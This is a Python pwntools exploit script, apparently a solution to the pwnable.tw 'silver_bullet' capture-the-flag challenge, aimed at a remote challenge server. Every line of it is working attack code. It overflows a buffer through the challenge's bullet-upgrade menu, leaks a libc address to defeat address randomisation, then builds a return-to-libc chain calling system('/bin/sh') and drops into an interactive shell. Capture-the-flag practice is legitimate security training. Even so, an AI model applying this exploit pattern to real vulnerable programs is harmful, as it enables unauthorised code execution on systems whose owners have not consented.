from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.proxy = (socks.SOCKS5, 'host.docker.internal', 7890)

# p = process('./silver_bullet')
p = remote('chall.pwnable.tw', 10103)

libc = ELF('./libc_32.so.6')

def create_bullet(content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Give me your description of bullet :')
    p.sendline(content)
    p.recvline()
    p.recvline()

def powerup_bullet(content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Give me your another description of bullet :')
    p.sendline(content)
    p.recvline()
    p.recvline()

def bullet_return():
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recv()

def beat():
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Oh ! You win !!\n')

# gdb.attach(p, '''
# b main
# b power_up
# b create_bullet
# ''')

printf_addr = 0x08048498
read_addr = 0x080485EB
main_addr = 0x08048954

create_bullet('A' * 46)
powerup_bullet('BB')
powerup_bullet(flat([p32(0xffffffff), 'BBB', p32(printf_addr), p32(0x08048954), p32(0x0804AFDC)]))
beat()
puts_addr = u32(p.recv(4))
puts_libc_addr = libc.symbols['puts']
libc_base_addr = puts_addr - puts_libc_addr
system_addr = libc_base_addr + libc.symbols['system']
sh_addr = next(libc.search(b'/bin/sh')) + libc_base_addr
log.info('system addr: ' + hex(system_addr))
log.info('sh addr: ' + hex(sh_addr))


create_bullet('A' * 46)
powerup_bullet('BB')
powerup_bullet(flat([p32(0xffffffff), 'BBB', p32(system_addr), p32(0x08048954), p32(sh_addr)]))
beat()


p.interactive()